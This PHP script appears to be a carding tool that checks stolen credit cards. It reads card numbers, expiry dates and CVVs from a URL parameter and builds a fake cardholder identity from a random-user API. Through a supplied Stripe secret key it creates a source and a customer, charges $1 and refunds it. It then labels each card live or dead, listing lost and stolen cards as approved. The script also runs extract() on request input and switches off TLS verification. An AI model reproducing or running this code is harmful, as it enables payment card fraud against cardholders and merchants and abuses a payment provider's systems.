<?php 

set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

// functions
function multiexplode($delimiters, $string)
{
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;
}

function GetStr($string, $start, $end)
{
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
}

$sec1 = $_GET['sec'];
extract($_GET);
$check = str_replace(" ", "", htmlspecialchars($check));


// cc seprator
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];


//Random Users
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$first = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

//==================[BIN LOOK-UP]======================//
// BIN DATA
            $bin = substr($cc, 0, 6);

//==================[BIN LOOK-UP]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://bin-checker.net/api/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: bin-checker.net',
'cache-control: max-age=0',
'upgrade-insecure-requests: 1',
'user-agent: Mozilla/5.0 (Linux; Android 8.1.0; LG-M700) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Mobile Safari/537.36',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-gpc: 1',
'sec-fetch-site: none',
'sec-fetch-mode: navigate',
'sec-fetch-user: ?1',
'sec-fetch-dest: document',
'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
'cookie: __cfduid=d910c93fc425a7727169a61c85a0fa2a21620032817'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

$pim = curl_exec($ch);

$scheme = GetStr($pim, '"scheme":"', '"');
$level = GetStr($pim,'"level":"','"');

$country = GetStr($pim,',"name":"','"');
$bank = GetStr($pim,'"bank":{"name":"','"');
$website = GetStr($pim,'"website":"','"');
$phone = GetStr($pim,'"phone":"','"');
$type = GetStr($pim,'"type":"','"');

if(empty($level)){
  $levelbin = "N/A";
}
if(empty($country)){
$countrybin = "N/A";
}
if(empty($bank)){
$bankbin = "N/A";
}
if(empty($website)){
$websitebin = "N/A";
}
if(empty($phone)){
$phonebin = "N/A";
}
if(empty($type)){
$typebin = "N/A";
}

//////////////////////////////////////////////////////////////////////////////////////////
//get sk

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sec1. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$first.' '.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');
$result1 = curl_exec($ch);


$mag1 = trim(strip_tags(GetStr($result1,'"message": "','"')));
$code1 = trim(strip_tags(GetStr($result1,'"code": "','"')));
$token = trim(strip_tags(GetStr($result1,'"id": "','"')));


///2nd request for auth resposne
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$name.'&source='.$token.'');
curl_setopt($ch, CURLOPT_USERPWD, $sec1 . ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result2 = curl_exec($ch);
$token2 = trim(strip_tags(GetStr($result2,'"id": "','"')));

//3rd request for charging cards, 
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=100&currency=usd&customer='.$token2.'');
curl_setopt($ch, CURLOPT_USERPWD, $sec1. ':' . '');

$result3 = curl_exec($ch);
$token3 = trim(strip_tags(getStr($result3,' "id": "','"')));

//4th request for refund
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/refunds');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'charge='.$token3.'&amount=100&reason=requested_by_customer');
curl_setopt($ch, CURLOPT_USERPWD, $sec1. ':' . '');
 
 $MADEBY = "[ @IndianBinner 🦊]";

$ip = "Live ☑️";
/////////////////////////// [Card Response]//////////////////////////

if(strpos($result3, '"seller_message": "Payment complete."' )) {
echo '<br><span class="badge badge-warning">Approved CVV ✓ </span> : ' . $lista . ' ➜  $1 CHARGED ➜ </span> IP : '.$ip.' ➜ ' . $type . ' ➜ ' . $scheme . ' ➜  ' . $bank . ' ➜ ' . $country . ' ➜ ' . $MADEBY . '</br>';
}
elseif ((strpos($result3,'"cvc_check": "pass"')) || (strpos($result2,'"cvc_check": "pass"'))){
echo '<br><span class="badge badge-warning">Approved CVV ✓ </span> : ' . $lista . ' ➜  CVV MATCHED ➜ </span> IP : '.$ip.' ➜ ' . $type . ' ➜ ' . $scheme . ' ➜  ' . $bank . ' ➜ ' . $country . ' ➜ ' . $MADEBY . '</br>';
}
elseif ((strpos($result2, 'Your card has insufficient funds.')) || (strpos($result2, 'insufficient_funds')) || (strpos($result3, 'Your card has insufficient funds.')) || (strpos($result3, 'insufficient_funds'))){
 echo '<br><span class="badge badge-warning">Approved CVV ✓ </span> : ' . $lista . ' ➜  INSUFFICIENT FUNDS ➜ </span> IP : '.$ip.' ➜ ' . $type . ' ➜ ' . $scheme . ' ➜  ' . $bank . ' ➜ ' . $country . ' ➜ ' . $MADEBY . '</br>';
}

elseif ((strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc")) || (strpos($result2, "The card's security code is incorrect.")) || (strpos($result3, "Your card's security code is incorrect.")) || (strpos($result3, "incorrect_cvc")) || (strpos($result3, "The card's security code is incorrect."))){
 echo '<br><span class="badge badge-success">Aprovada ✓ </span> : ' . $lista . ' ➜  CCN MATCHED ➜ </span> IP : '.$ip.' ➜ ' . $type . ' ➜ ' . $scheme . ' ➜  ' . $bank . ' ➜ ' . $country . ' ➜ ' . $MADEBY . '</br>';
}
elseif ((strpos($result3, "fraudulent" )) || (strpos($result2, "fraudulent" ))) {
echo '<br><span class="badge badge-warning">Reprovada ✗ </span> : ' . $lista . ' ➜  FRAUDULENT ➜</span> IP: '.$ip.' ➜ ' . $type . ' ➜ ' . $scheme . ' ➜  ' . $bank . ' ➜ ' . $country . ' ➜ ' . $MADEBY . '</br>';
}

elseif ((strpos($result1, 'The card number is incorrect.')) || (strpos($result1, 'Your card number is incorrect.')) || (strpos($result1, 'incorrect_number')) || (strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'incorrect_number')) || (strpos($result3, 'The card number is incorrect.')) || (strpos($result3, 'Your card number is incorrect.')) || (strpos($result3, 'incorrect_number'))){
 echo '<br><span class="badge badge-danger">Reprovada ✗ </span> : ' . $lista . ' ➜ Incorrect Card Number ➜ IP: '.$ip.' ➜ ' . $type . ' ➜ ' . $scheme . ' ➜  ' . $bank . ' ➜ ' . $country . ' ➜ ' . $MADEBY . '</br>';
}

elseif(strpos($result2,"invalid_account")){
echo '<br><span class="badge badge-danger">Reprovada ✗ </span> : ' . $lista . ' ➜ Invalid Account ➜ IP: '.$ip.' ➜ ' . $type . ' ➜ ' . $scheme . ' ➜  ' . $bank . ' ➜ ' . $country . ' ➜ ' . $MADEBY . '</br>';
}

elseif ((strpos($result2, "lost_card" )) || (strpos($result3, "lost_card" ))) {
echo '<br><span class="badge badge-success">Aprovada ✓ </span> : ' . $lista . ' ➜  CCN MATCHED ➜ Lost Card ➜ </span> IP : '.$ip.' ➜ ' . $type . ' ➜ ' . $scheme . ' ➜  ' . $bank . ' ➜ ' . $country . ' ➜ ' . $MADEBY . '</br>';
}

elseif ((strpos($result2, "stolen_card" )) || (strpos($result3, "stolen_card" ))) {
echo '<br><span class="badge badge-success">Aprovada ✓ </span> : ' . $lista . ' ➜  CCN MATCHED ➜ Stolen Card ➜ </span> IP : '.$ip.' ➜ ' . $type . ' ➜ ' . $scheme . ' ➜  ' . $bank . ' ➜ ' . $country . ' ➜ ' . $MADEBY . '</br>';
}

elseif ((strpos($result2, "pickup_card" )) || (strpos($result3, "pickup_card" ))) {
echo '<br><span class="badge badge-success">Aprovada ✓ </span> : ' . $lista . ' ➜  CCN MATCHED ➜ Pickup Card ➜ </span> IP : '.$ip.' ➜ ' . $type . ' ➜ ' . $scheme . ' ➜  ' . $bank . ' ➜ ' . $country . ' ➜ ' . $MADEBY . '</br>';
}

elseif ((strpos($result2, "Your card has expired." )) || (strpos($result3, "Your card has expired." ))) {
echo '<br><span class="badge badge-danger">Reprovada ✗ </span> : ' . $lista . ' ➜ Your Card Has Expired ➜ IP: '.$ip.' ➜ ' . $type . ' ➜ ' . $scheme . ' ➜  ' . $bank . ' ➜ ' . $country . ' ➜ ' . $MADEBY . '</br>';
}

elseif ((strpos($result2, "transaction_not_allowed" )) || (strpos($result3, "transaction_not_allowed" ))) {
echo '<br><span class="badge badge-danger">Reprovada ✗ </span> : ' . $lista . ' ➜ Transaction Not Allowed ➜ IP: '.$ip.' ➜ ' . $type . ' ➜ ' . $scheme . ' ➜  ' . $bank . ' ➜ ' . $country . ' ➜ ' . $MADEBY . '</br>';
}

elseif ((strpos($result2, "do_not_honor" )) || (strpos($result3, "do_not_honor" ))) {
echo '<br><span class="badge badge-danger">Reprovada ✗ </span> : ' . $lista . ' ➜ Do Not Honor ➜ IP: '.$ip.' ➜ ' . $type . ' ➜ ' . $scheme . ' ➜  ' . $bank . ' ➜ ' . $country . ' ➜ ' . $MADEBY . '</br>';
}

elseif ((strpos($result1, "generic_decline" )) || (strpos($result2, "generic_decline" )) || (strpos($result3, "generic_decline" ))) {
echo '<br><span class="badge badge-danger">Reprovada ✗ </span> : ' . $lista . ' ➜ Generic Decline ➜ IP: '.$ip.' ➜ ' . $type . ' ➜ ' . $scheme . ' ➜  ' . $bank . ' ➜ ' . $country . ' ➜ ' . $MADEBY . '</br>';
}

elseif ((strpos($result1, "testmode_charges_only" )) || (strpos($result2, "testmode_charges_only" )) || (strpos($result3, "testmode_charges_only" ))) {
echo '<br><span class="badge badge-danger">Reprovada ✗ </span> : ' . $lista . ' ➜ Testmode Charges Only ➜ IP: '.$ip.' ➜ ' . $type . ' ➜ ' . $scheme . ' ➜  ' . $bank . ' ➜ ' . $country . ' ➜ ' . $MADEBY . '</br>';
}

elseif ((strpos($result1, "You did not provide an API key." )) || (strpos($result2, "You did not provide an API key." )) || (strpos($result3, "You did not provide an API key." ))) {
echo '<br><span class="badge badge-danger">Reprovada ✗ </span> : ' . $lista . ' ➜ You Did Not Provide An API Key ➜ IP: '.$ip.' ➜ ' . $type . ' ➜ ' . $scheme . ' ➜  ' . $bank . ' ➜ ' . $country . ' ➜ ' . $MADEBY . '</br>';
}

elseif ((strpos($result1, "api_key_expired" )) || (strpos($result2, "api_key_expired" )) || (strpos($result3, "api_key_expired" ))) {
echo '<br><span class="badge badge-danger">Reprovada ✗ </span> : ' . $lista . ' ➜ Api Key Expired ➜ IP: '.$ip.' ➜ ' . $type . ' ➜ ' . $scheme . ' ➜  ' . $bank . ' ➜ ' . $country . ' ➜ ' . $MADEBY . '</br>';
}

elseif ((strpos($result1, "Invalid API Key provided" )) || (strpos($result2, "Invalid API Key provided" )) || (strpos($result3, "Invalid API Key provided" ))) {
echo '<br><span class="badge badge-danger">Reprovada ✗ </span> : ' . $lista . ' ➜ Invalid API Key provided ➜ IP: '.$ip.' ➜ ' . $type . ' ➜ ' . $scheme . ' ➜  ' . $bank . ' ➜ ' . $country . ' ➜ ' . $MADEBY . '</br>';
}


elseif(strpos($result2,'"cvc_check": "unchecked"')){
echo '<br><span class="badge badge-danger">Reprovada ✗ </span> : ' . $lista . ' ➜ Card Was Declined ➜ IP: '.$ip.' ➜ ' . $type . ' ➜ ' . $scheme . ' ➜  ' . $bank . ' ➜ ' . $country . ' ➜ ' . $MADEBY . '</br>';
}

elseif(strpos($result2,'"cvc_check": "fail"')){
echo '<br><span class="badge badge-danger">Reprovada ✗ </span> : ' . $lista . ' ➜ Your Card Was Declined ➜ IP: '.$ip.' ➜ ' . $type . ' ➜ ' . $scheme . ' ➜  ' . $bank . ' ➜ ' . $country . ' ➜ ' . $MADEBY . '</br>';
}

elseif(strpos($result2,'"cvc_check": "unavailable"')){
echo '<br><span class="badge badge-danger">Reprovada ✗ </span> : ' . $lista . ' ➜ Card Declined ➜ IP: '.$ip.' ➜ ' . $type . ' ➜ ' . $scheme . ' ➜  ' . $bank . ' ➜ ' . $country . ' ➜ ' . $MADEBY . '</br>';
}

else {
 echo '<br><span class="badge badge-danger">Reprovada ✗ </span> : ' . $lista . ' ➜ Req 1 : '.$result1.' ➜  Req 2: '.$resul2t.' ➜  Req 3: '.$result3.'➜ IP: '.$ip.' ➜ ' . $type . ' ➜ ' . $scheme . ' ➜  ' . $bank . ' ➜ ' . $country . ' ➜ ' . $MADEBY . '</br>';
}

//////////////////////


///////////

curl_close($curl);
ob_flush();

?>